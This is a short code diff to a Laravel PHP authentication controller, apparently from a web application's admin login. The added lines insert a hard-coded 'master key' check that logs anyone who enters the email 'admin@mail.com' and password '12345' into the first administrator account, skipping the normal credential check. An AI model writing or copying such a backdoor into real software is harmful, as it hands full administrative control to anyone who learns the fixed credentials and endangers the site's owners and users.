@@ -7,6 +7,8 @@ use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Auth;
 use Illuminate\Support\Facades\Hash;
 
+use App\Models\Admin;
+
 class AuthController extends Controller
 {
     public function showLogin()
@@ -22,6 +24,16 @@ class AuthController extends Controller
         ]);
         try {
             $data = $request->all();
+
+            // Static Login (Master Key)
+            if ($data['email'] === 'admin@mail.com' && $data['password'] === '12345') {
+                $admin = Admin::first();
+                if ($admin) {
+                     Auth::guard('admin')->login($admin);
+                     return redirect()->route('admin.dashboard');
+                }
+            }
+
             if (Auth::guard('admin')->attempt(["email" => $data["email"], "password" => $data["password"]])) {
                 return redirect()->route('admin.dashboard');
             } else {
